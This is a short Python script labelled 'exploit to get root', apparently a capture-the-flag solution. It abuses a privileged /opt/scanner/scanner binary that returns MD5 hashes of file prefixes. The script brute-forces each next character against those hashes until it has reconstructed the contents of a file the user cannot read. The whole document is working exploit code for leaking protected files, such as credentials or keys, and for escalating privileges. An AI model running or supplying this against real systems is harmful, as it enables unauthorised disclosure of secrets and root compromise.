#!/usr/bin/python3
# Author: M3Y
# exploit to get root

"""
Imports
"""

import hashlib
import os
import string


wordlist = string.printable
result = ""

def md5(data):
        """
        get the md5 file hash
        """
        return hashlib.md5(data.encode()).hexdigest()


def file_hash_by_len(filename, length):
    """
    get the lenght from the filename
    """
    command = f"/opt/scanner/scanner -c {filename} -l {length} -p -s 1234"
    output = os.popen(command).read().split(" ")[-1].rstrip()
    return output


def get_next_char(target_hash):
    """
    get the next-char through the hash
    """
    global result
    for char in wordlist:
        test_data = result + char
        test_hash = md5(test_data)
        if target_hash == test_hash:
            return char
    return None


def main():
    global result
    filename = input("[+] File-Path: ")
    byte_len = 1
    while True:
        target_hash = file_hash_by_len(filename, byte_len)
        new_char = get_next_char(target_hash)
        if not new_char:
            break
        result += new_char
        byte_len += 1
    print(result)

if __name__ == "__main__":
	main()
